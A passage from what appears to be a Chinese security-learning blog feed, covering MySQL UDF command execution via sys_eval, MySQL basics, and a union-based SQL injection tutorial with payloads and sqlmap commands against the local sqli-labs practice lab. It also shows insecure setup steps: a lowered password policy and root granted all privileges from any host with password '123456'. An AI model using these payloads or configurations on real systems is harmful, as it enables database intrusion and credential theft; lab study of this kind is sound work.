class="code"><pre><span class="line">mysql&gt; create function sys_eval returns string soname &quot;lib_mysqludf_sys.so&quot;;</span><br><span class="line">Query OK, 0 rows affected (0.14 sec)</span><br></pre></td></tr></table></figure><p><strong>3)执行自定义函数</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sys_eval(&#39;whoami&#39;);</span><br><span class="line">+--------------------+</span><br><span class="line">| sys_eval(&#39;whoami&#39;) |</span><br><span class="line">+--------------------+</span><br><span class="line">| mysql       |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.04 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">+----------+-----+-------------+----------+</span><br><span class="line">| name   | ret | dl     | type   |</span><br><span class="line">+----------+-----+-------------+----------+</span><br><span class="line">| sys_eval |  0 | lib_mysqludf_sys.so | function |</span><br><span class="line">+----------+-----+-------------+----------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; drop function sys_eval;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from func;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://blog.csdn.net/hellokandy/article/details/82964077">MySQL 常用内置函数与所有内置函数</a></p><p>[2] <a href="https://blog.csdn.net/qq_34845394/article/details/90077070">MySQL常用内置函数</a></p><p>[3] <a href="https://www.cnblogs.com/litlife/p/9030673.html">udf提权原理详解</a></p><p>[4] <a href="https://www.jb51.net/article/51767.htm">Linux利用UDF库实现Mysql提权</a></p><p>[5] <a href="https://blog.csdn.net/qq_36119192/article/details/84863268?utm_medium=distribute.pc_relevant.none-task-blog-baidulandingword-2&spm=1001.2101.3001.4242">MySQL UDF提权执行系统命令</a></p><p>[6] <a href="https://blog.csdn.net/Zlirving_/article/details/106423442?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1.control">Mysql——udf提权</a></p><p>[7] <a href="https://bingslient.github.io/2019/10/31/MySQL%20%E5%87%BD%E6%95%B0%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8">MySQL 函数及其利用</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全学习 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL基础操作学习</title>
      <link href="posts/8774.html"/>
      <url>posts/8774.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>认识数据库</p><ul><li>数据库 : 用来存储海量数据的仓库 。</li><li>SQL ：用于访问和处理数据库的计算机语言。</li></ul><p>分类：</p><ul><li>关系型数据库（二维表格形式）：Oracle,MySQL,MariaDB,SQL Server…</li><li>非关系型数据库（not only sql）: Memcached,redis,MongoDB…</li></ul></blockquote><h1 id="MySQL基础操作"><a href="#MySQL基础操作" class="headerlink" title="MySQL基础操作"></a>MySQL基础操作</h1><p>安装mysql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mysql-server mysql-client</span><br></pre></td></tr></table></figure><p>登录mysql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/zXqlJhGSIiWtvbD.png" alt="image-20201109225823132"></p><p>退出mysql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\q </span><br></pre></td></tr></table></figure><p>当前用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT USER();</span><br></pre></td></tr></table></figure><p>当前日期时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT NOW();</span><br></pre></td></tr></table></figure><p>当前版本信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT VERSION();</span><br></pre></td></tr></table></figure><p>服务器状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW STATUS;</span><br></pre></td></tr></table></figure><p>服务器配置变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES;</span><br></pre></td></tr></table></figure><h2 id="用户相关命令"><a href="#用户相关命令" class="headerlink" title="用户相关命令"></a>用户相关命令</h2><p>（1）创建用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create user &#39;name&#39;@&#39;host&#39; identified by &#39;password&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/sWatwF4vhOJYTNA.png" alt="image-20201112171427748"></p><p>（2）删除用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop user name@&#39;host&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/oe5ZK9Fv1qEkCAQ.png" alt="image-20201112171814162"></p><p>（3）为用户授权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant some_privileges on *.* to &#39;name&#39;@&#39;host&#39;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/fy1be78PohEBaL5.png" alt="image-20201112172854469"></p><p>查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where user&#x3D;&#39;wyw&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/D6eKVu1wSGP3IvT.png" alt="image-20201112173201025"></p><p>（4）撤销用户权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">revoke some_privileges to *.* from &#39;name&#39;@&#39;host&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/qmYS8la1EuW27iB.png" alt="image-20201112174611837"></p><p>查看</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/9MGbYT5ym1ASae3.png" alt="image-20201112174719182"></p><h2 id="库相关命令"><a href="#库相关命令" class="headerlink" title="库相关命令"></a>库相关命令</h2><p>（1）增</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE db_name;</span><br></pre></td></tr></table></figure><hr><p>（2）删</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP DATABASE db_name;</span><br></pre></td></tr></table></figure><p>（3）查</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASES;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW CREATE DATABASE db_name;</span><br></pre></td></tr></table></figure><p>（4）打开数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE db_name;</span><br></pre></td></tr></table></figure><p>（5）查看当前所在数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DATABASE();</span><br></pre></td></tr></table></figure><h2 id="表相关命令"><a href="#表相关命令" class="headerlink" title="表相关命令"></a>表相关命令</h2><p>（1）增</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE table_name(</span><br><span class="line">column_name data_type,</span><br><span class="line">......</span><br><span class="line">)[ENGINE&#x3D;MYISAM DEFAULT CHARSET&#x3D;UTF8MB4];</span><br></pre></td></tr></table></figure><p>// []中内容可省略。</p><p>eg:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE user(</span><br><span class="line">uid INT AUTO_INCREMENT PRIMARY KEY,</span><br><span class="line">username VARCHAR(30) NOT NULL,</span><br><span class="line">pwd CHAR(32) NOT NULL,</span><br><span class="line">pic CHAR(40) NOT NULL DEFAULT &#39;a.jpg&#39;,</span><br><span class="line">money DECIMAL(8,2),</span><br><span class="line">content TEXT,</span><br><span class="line">sex ENUM(&#39;male&#39;,&#39;female&#39;,&#39;secret&#39;),</span><br><span class="line">age TINYINT UNSIGNED NOT NULL DEFAULT &#39;18&#39;</span><br><span class="line">)[ENGINE&#x3D;MYISAM DEFAULT CHARSET&#x3D;UTF8MB4];</span><br></pre></td></tr></table></figure><p>（2）删</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE table_name;</span><br></pre></td></tr></table></figure><p>（3）改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE tab_name RENAME new_tab_name;</span><br></pre></td></tr></table></figure><p>（4）查</p><p>查看表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW TABLES[FROM db_name];</span><br></pre></td></tr></table></figure><p>查看数据表结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DESC table_name;   </span><br></pre></td></tr></table></figure><h2 id="字段相关命令"><a href="#字段相关命令" class="headerlink" title="字段相关命令"></a>字段相关命令</h2><p>（1）增</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE table_name ADD col_name col_definition[FIRST|AFTER col_name];</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE table_name ADD (col_name col_definition,...);</span><br></pre></td></tr></table></figure><p>（2）删</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE table_name DROP col_name;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE table_name DROP col_name,DROP col_name,...;</span><br></pre></td></tr></table></figure><p>（3）改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE tab_name MODIFY col_name col_definition[FIRST|AFTER col_name];</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE tab_name CHANGE old_col_name new_col_name col_definition[FIRST|AFTER col_name];</span><br></pre></td></tr></table></figure><h2 id="数据相关命令"><a href="#数据相关命令" class="headerlink" title="数据相关命令"></a>数据相关命令</h2><p>（1）增</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name(column_name,...)</span><br><span class="line">VALUES(&#39;&#39;,&#39;&#39;,...)，(&#39;&#39;,&#39;&#39;,...),...;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name SET col_name&#x3D;expr,...;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name(col_name) SELECT col_name FROM table_reference;</span><br></pre></td></tr></table></figure><p>（2）删</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM table_name [WHERE where_condition];</span><br></pre></td></tr></table></figure><p>（3）改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name SET col_name1&#x3D;expr,col_name2&#x3D;expr,...[WHERE where_condition];</span><br></pre></td></tr></table></figure><p>（4）查</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table_name [WHERE where_condition];</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name,... FROM table_name;</span><br></pre></td></tr></table></figure><p>查询结果分组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT col_name FROM table_name GROUP BY col_name;</span><br></pre></td></tr></table></figure><p>查询结果排序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT col_name FROM table_name ORDER BY col_name ASC|DESC;</span><br></pre></td></tr></table></figure><p>限制查询结果返回数量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table_name LIMIT row_count;</span><br></pre></td></tr></table></figure><p>（5）连接</p><p>mysql在SELECT,UPDATE,DELETE语句中支持JOIN操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table_reference INNER|LEFT|RIGHT JOIN table_reference ON conditional_expr</span><br></pre></td></tr></table></figure><h1 id="密码设置与远程连接"><a href="#密码设置与远程连接" class="headerlink" title="密码设置与远程连接"></a>密码设置与远程连接</h1><h2 id="MySQL中为root用户设置密码"><a href="#MySQL中为root用户设置密码" class="headerlink" title="MySQL中为root用户设置密码"></a>MySQL中为root用户设置密码</h2><p>进入mysql后发现root用户密码为空</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE mysql;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT host,user,authentication_string FROM user;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/3AYLdpV4iGK6Bzu.png" alt="image-20201101233018450"></p><p>使用以下命令设置密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;新密码&#39; PASSWORD EXPIRE NEVER;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER &#39;root&#39;@&#39;%&#39; IDENTIFIED WITH mysql_native_password BY &#39;新密码&#39;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure><p>出现错误：</p><p><strong>ERROR 1819 (HY000): Your password does not satisfy the current policy requirements</strong></p><p>查找资料：</p><p>原因是因为密码设置的过于简单会报错,MySQL有密码设置的规范</p><p>如果想要查看MySQL完整的初始密码规则,登陆后执行以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#39;validate_password%&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/ZTkVwiKIoWrHGtb.png" alt="image-20201101235231684"></p><p>validate_password.length决定密码的长度,默认长度为8位，可以通过以下命令修改为4位：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global validate_password.length&#x3D;4;</span><br></pre></td></tr></table></figure><p>validate_password_policy决定密码的验证策略,默认等级为MEDIUM(中等),可以通过以下命令修改为LOW(低)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global validate_password.policy&#x3D;0;</span><br></pre></td></tr></table></figure><p>修改完成后密码就可以设置的很简单。</p><p>再次设置密码</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/PeC6lhpZ4gVNJG1.png" alt="image-20201101235825039"></p><p>成功!</p><p>退出后重新使用设置的密码进入MySQL</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/Q8HoYIWZLOrpGmy.png" alt="image-20201101235949729"></p><p>再次查看用户及密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT host,user,authentication_string FROM user;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/VzMwpaEI18cnTbL.png" alt="image-20201102000107053"></p><p>完成!</p><h2 id="Navicat远程连接MySQL"><a href="#Navicat远程连接MySQL" class="headerlink" title="Navicat远程连接MySQL"></a>Navicat远程连接MySQL</h2><p>1)修改配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure><p>查找到bind-address,将bind-address=127.0.0.1 修改为bind-address=0.0.0.0 ,以允许任何IP来访问MySQL服务</p><p>2）重启MySQL服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mysql restart</span><br></pre></td></tr></table></figure><p>3）给需要远程访问的用户授权</p><p>授权所有权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges on *.* to &#39;root&#39;@&#39;%&#39; identified by &#39;123456&#39; with grant option;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201118172547045.png" alt="image-20201118172547045"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://www.pianshen.com/article/251865160/">Linux下重置mysql8.0密码</a></p><p>[2] <a href="https://blog.csdn.net/calistom/article/details/87939956">ERROR 1819 (HY000): Your password does not satisfy the current policy requirements</a></p><p>​                 </p>]]></content>
      
      
      <categories>
          
          <category> Web安全学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全学习 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入基础</title>
      <link href="posts/20316.html"/>
      <url>posts/20316.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>SQL注入就是通过把SQL命令插入到 Web表单提交 或 URL 或 页面请求等的查询字符串中，最终达到欺骗服务器执行恶意的SQL命令。即：将构造的SQL语句插入到正常提交的字符串中，并使服务器将字符串中的命令解析为可执行命令而不是字符串。</p><p>SQL注入产生的原因：许多网页程序员在编写代码的时候，没有对用户输入数据的合法性进行严格的判断和过滤，从而导致应用程序存在该漏洞。</p><p>MySQL手工注入原理：主要是利用mysql自带的information_schema数据库，information_schema这个数据库保存了MySQL上所有数据库的信息。如有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema数据库里面。</p></blockquote><p>SQL注入练习环境：Sqlilabs</p><p><a href="https://github.com/Rinkish/Sqli_Edited_Version">https://github.com/Rinkish/Sqli_Edited_Version</a></p><h1 id="GET-Union注入"><a href="#GET-Union注入" class="headerlink" title="GET Union注入"></a>GET Union注入</h1><h2 id="手动测试"><a href="#手动测试" class="headerlink" title="手动测试"></a>手动测试</h2><p><strong>1.判断是否存在注入点</strong></p><p>通过在URL中修改对应的ID值，为正常数字，大数字，字符（单引号，双引号，双单引号，括号，反斜杆)来探测URL中是否存在注入点。</p><p>判断注入类型：</p><p>数字型注入：id=1 返回正常 –&gt; id=2-1 返回正常</p><p>字符型注入：id=1 返回正常 –&gt; id=1a 返回正常 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1    #正常显示</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130203101671.png" alt="image-20201130203101671"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39;   </span><br><span class="line">&#x2F;&#x2F;添加单引号后报错,猜测sql语句 SELECT * FROM users WHERE id&#x3D;&#39;1&#39;&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128231003746.png" alt="image-20201128231003746"></p><p><strong>2.添加注释（添加的单引号闭合前面的单引号，再用注释符注释掉后面内容）</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39;--+        </span><br><span class="line">&#x2F;&#x2F;后面加上and &#39;1&#39;&#x3D;&#39;1 ,or &#39;1&#39;&#x3D;&#39;1 ,and &#39;1&#39; like &#39;1，or&#39; &#39;&#x3D;1&#x3D;&#39; 亦可，闭合单引号</span><br><span class="line">sql语句 SELECT * FROM users WHERE id&#x3D;&#39;1&#39;-- &#39; LIMIT 0,1</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128231239638.png" alt="image-20201128231239638"></p><p>注释符：在Mysql中常见的注释符表达式：#(%23) 或–空 格或 /**/</p><p>内联注释： /*! SQL语句 */ 只有Mysql可以识别，常用来绕过WAF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from articles where id &#x3D; -1 &#x2F;*!union*&#x2F; &#x2F;*!select*&#x2F; 1,2,3,4</span><br></pre></td></tr></table></figure><p><strong>3.判断字段数量(使用order by 对字段排序)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 1--+  #对第一列排序，正常</span><br></pre></td></tr></table></figure><p>……</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 4--+  #对第四列排序，报错，表明没有第四列</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128231715638.png" alt="image-20201128231715638"></p><p>即有3个字段</p><p><strong>4.报显示位，id设为查询不到的数据（使用union联合查询，前后的表中要有相同的字段数，然后让左边查询无结果，右边有结果）</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128232240296.png" alt="image-20201128232240296"></p><p><strong>5.查询相关信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,database(),3--+  #查询当前数据库</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128233025336.png" alt="image-20201128233025336"></p><p>其他信息 user(),version()…</p><p><strong>6.查询具体信息</strong></p><p>1）查询所有库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128234024839.png" alt="image-20201128234024839"></p><p>2）查询当前库的所有表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128234247143.png" alt="image-20201128234247143"></p><p>3）查询表中字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;--+</span><br></pre></td></tr></table></figure><p>引号内 users 转换为十六进制亦可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;0x7573657273--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128234755093.png" alt="image-20201128234755093"></p><p><strong>7.查询数据</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(id,0x3a,password,0x3a,username),3 from users--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128235121970.png" alt="image-20201128235121970"></p><p><strong>8.查询基本信息</strong></p><p>查询基本信息主要是利用数据库中的内置函数来获取信息。</p><ul><li>version()——MySQL版本</li><li>user()——用户名</li><li>database()——数据库名</li><li>@@datadir——数据库路径</li><li>@@version_compile_os——操作系统版本</li></ul><h2 id="利用Sqlmap测试"><a href="#利用Sqlmap测试" class="headerlink" title="利用Sqlmap测试"></a><strong>利用Sqlmap测试</strong></h2><p>Sqlmap是检测和利用SQL注入漏洞的一款强大工具。</p><p><strong>1.查询库</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --dbs --batch</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129153523160.png" alt="image-20201129153523160"></p><p><strong>2.查询表</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D security --tables --batch</span><br></pre></td></tr></table></figure><p><img 